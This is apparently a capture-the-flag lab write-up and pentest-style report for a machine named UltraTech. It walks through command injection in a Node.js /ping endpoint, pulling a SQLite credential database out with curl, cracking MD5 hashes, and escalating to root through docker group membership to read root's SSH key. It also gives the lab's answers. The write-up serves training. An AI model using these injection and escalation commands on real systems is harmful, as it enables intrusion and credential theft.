# UltraTech Report

## 1. Summary
A command-injection flaw in the Node.js API running on TCP 8081 allowed remote code execution, disclosure of a SQLite database containing unsalted MD5 password hashes, and subsequent SSH access as a regular user. Membership of that user in the docker group enabled privilege escalation to root and extraction of the root user’s private SSH key. 

---

| Risk  | Impact | Severity |
| --- | --- | --- |
| Remote code execution | Complete host takeover | Critical

<span>&nbsp;</span>

## 2. Scope
The assessment was limited to a single internet-accessible Linux host at IP `10.10.106.75`. Black-box testing - no credentials were provided. 


<span>&nbsp;</span>

## 3. Methodology
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

<span>&nbsp;</span>

## 4. Environment Overview
The target environment consists of a single Ubuntu-based Linux host. The system runs several services, including a vulnerable Node.js API and an Apache HTTP server on a non-standard port. Enumeration revealed the following:

| Port | Service         | Version         | Notes                             |
|------|------------------|------------------|-----------------------------------|
| 22   | OpenSSH          | 7.6p1            | Default SSH access                |
| 8081 | Node.js API      | ExpressJS        | Command injection in `/ping`     |
| 31331| Apache HTTPD     | 2.4.29           | Uncommon port                     |

- **Operating System:** Ubuntu 
- **Database:** SQLite file (`utech.db.sqlite`) 
- **Containerization:** Docker 


<span>&nbsp;</span>

## 5. Findings
### 5.1 Remote Code Execution in `/ping` endpoint
- **Vector:**  Unfiltered back-tick expansion inside ip parameter. 

- **Proof of Concept:** 

    ```BASH
    curl "http://10.10.106.75:8081/ping?ip=`id`"
    ```
    Response shows execution of `/usr/bin/id` on the server.

- **Impact:** Arbitrary command execution with Node.js service account privileges.

- **Severity:** Critical

<span>&nbsp;</span>

### 5.2 SQLite Database Disclosure
- **Vector:** RCE used to list files, revealing utech.db.sqlite.  

- **Proof of Concept:** 
    ```BASH
    curl "http://10.10.106.75:8081/ping?ip=%60ls%60"
    ```
- **Impact:** Download of full credential store.

- **Severity:** High

<span>&nbsp;</span>

### 5.3 Weak Password Storage and Cracking
- **Vector:** Unsalted MD5 hashes stored in the SQLite users table.
- **Proof of Concept:**
    ```BASH
    curl "http://10.10.106.75:8081/ping?ip=%60tail%20-c%20+100%20utech.db.sqlite%20|%20base64%60"
    ```
    Result: r00t:n100906

- **Impact:** Disclosure of credentials enables direct SSH login.

- **Severity:** High

<span>&nbsp;</span>

## 5.4 Privilege Escalation via docker Group
- **Vector:** User r00t is in docker group

- **Proof of Concept:**
    ```BASH
    id
    docker images
    docker run --rm -v /:/mnt -it bash chroot /mnt bash
    ```

- **Impact:** Full root control of the underlying host

- **Severity:** Critical

<span>&nbsp;</span>

## 5.5 Exposure of Root Private SSH Key
- **Vector:** Root shell from 5.4 grants read access to /root/.ssh

- **Proof of Concept:**
    ```BASH
    cat /root/.ssh/id_rsa | head -n1
    ```
- **Impact:** Unrestricted key-based SSH access wherever the key is trusted

- **Severity:** Critical

<span>&nbsp;</span>

## Walktrough

Run an Nmap service scan to identify open ports and running services:
```BASH
sudo nmap -sV -p- $ip
```
![image](https://github.com/user-attachments/assets/86211cbe-6781-45e0-b957-4dd12bedcde8)

---

### Which software is using the port 8081?
<pre>node.js</pre>

---

### Which other non-standard port is used?
<pre>31331</pre>

---

### Which software using this port?
<pre>Apache</pre>

---

### Which GNU/Linux distribution seems to be used?
<pre>Ubuntu</pre>

---

### The software using the port 8081 is a REST api, how many of its routes are used by the web application?
Use Gobuster to enumerate hidden directories:
```BASH
gobuster dir -u "http://$ip$:8081/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
```
![image-2](https://github.com/user-attachments/assets/023b17ab-3974-4626-8f30-858bb8332f71)


<pre>2</pre>

---

### There is a database lying around, what is its filename?
```BASH
curl "http://10.10.106.75:8081/ping?ip=%60ls%60"
```
![image-4](https://github.com/user-attachments/assets/eed9f886-2fa1-412b-896e-539d09fd96a1)


That confirms the database file is `utech.db.sqlite` and backend can be command injected and access to shell-level commands inside the backend
<pre>utech.db.sqlite</pre>

---

### What is the first user's password hash?
Leak DB in chunks:
```BASH
curl "http://10.10.106.75:8081/ping?ip=%60tail%20-c%20+100%20utech.db.sqlite%20|%20base64%60"
```
![image-5](https://github.com/user-attachments/assets/efad49ef-de39-43b1-b1f1-c588c4c45c26)


<pre>r00tf357a0c52799563c7c7b76c1e7543a32</pre>

---

### What is the password associated with this hash?
Go to [CrackStation](https://crackstation.net/) to crack hash. 

![image-7](https://github.com/user-attachments/assets/332714cf-219e-478b-ad69-3ee4294c1b4b)


Or use hashcat:
```BASH
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```
![image-8](https://github.com/user-attachments/assets/d4bc2a1f-6bf6-49f6-8693-4b9df0a3996f)

<pre>n100906</pre>

---

### What are the first 9 characters of the root user's private SSH key?

SSH as r00t:
```BASH
ssh r00t@10.10.106.75
```

---

Ran `id` command to confirm your user identity on the system:  

![image-10](https://github.com/user-attachments/assets/846206f2-bed0-40e9-afbe-ed62272809b7)


Being in the docker group is equivalent to root access, because Docker lets mount the host filesystem and run containers as root. Exploit it by using [GTFOBins](https://gtfobins.github.io). There is no alpine image so you have to check which image is accessible:
```BASH
docker images
docker run -v /:/mnt --rm -it bash chroot /mnt bash
```
![image-11](https://github.com/user-attachments/assets/4dcb7006-eff7-48b1-b326-dbd88714c72e)


---

Go to `/root/.ssh` directory and read id_rsa file:  

![image-12](https://github.com/user-attachments/assets/95a3e81f-e1df-4a94-a649-bb0423182c01)
